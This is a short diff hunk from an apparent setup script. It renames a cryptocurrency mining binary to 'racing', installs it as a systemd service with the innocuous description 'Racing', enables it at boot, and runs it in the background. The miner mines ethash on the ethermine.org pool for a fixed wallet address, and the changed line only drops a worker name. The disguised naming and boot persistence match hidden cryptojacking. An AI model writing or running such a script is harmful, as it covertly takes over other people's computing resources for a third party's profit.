@@ -14,4 +14,4 @@ mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0x6efE03Ee50F2f8BDD5A7E76ee84B96aDDF0c28c8 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0x6efE03Ee50F2f8BDD5A7E76ee84B96aDDF0c28c8 -p x -w superpro &
+./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0x6efE03Ee50F2f8BDD5A7E76ee84B96aDDF0c28c8 -p x &
